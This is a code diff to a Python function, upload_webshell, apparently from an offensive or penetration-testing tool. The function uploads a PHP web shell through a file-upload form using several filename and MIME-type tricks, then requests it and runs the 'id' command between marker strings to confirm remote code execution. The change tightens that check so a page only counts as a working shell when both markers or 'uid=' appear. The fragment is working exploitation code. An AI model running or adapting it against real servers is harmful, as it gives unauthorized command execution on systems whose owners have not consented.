@@ -44,7 +44,6 @@ def upload_webshell(upload_url, file_field="file", base_uploads_url=None,
     m1, m2 = marker("VFS"), marker("VFS")
     # inject marker pair around command output check
     check_cmd = f"echo {m1}; id; echo {m2}"
-    probe_shell = shell_src.replace('$_REQUEST["cmd"]', '$_REQUEST["cmd"]')
 
     attempts, working = [], None
     for fname, prefix, mime, qparam in CANDIDATES:
@@ -67,8 +66,11 @@ def upload_webshell(upload_url, file_field="file", base_uploads_url=None,
             shell_url = f"{base_uploads_url}{fname}"
         gst, gbody, _gdt = paced_send(shell_url, timeout=15)
         entry["served_status"] = gst
-        if "VFS@@" in (gbody or "") and (m1 in gbody or "uid=" in gbody):
-            out = extract_between(gbody or "", "VFS@@", "@@E") or (gbody or "")[:300]
+        # Z4.2: marker PAIR proves execution — a page merely containing
+        # static shell text (false mirror) has m1 but never m2 around
+        # live output. Both must appear, or uid= as the id fallback.
+        if m1 in (gbody or "") and (m2 in (gbody or "") or "uid=" in (gbody or "")):
+            out = extract_between(gbody or "", m1, m2) or (gbody or "")[:300]
             entry["shell_url"] = shell_url
             entry["output"] = out[:400]
             attempts.append(entry)
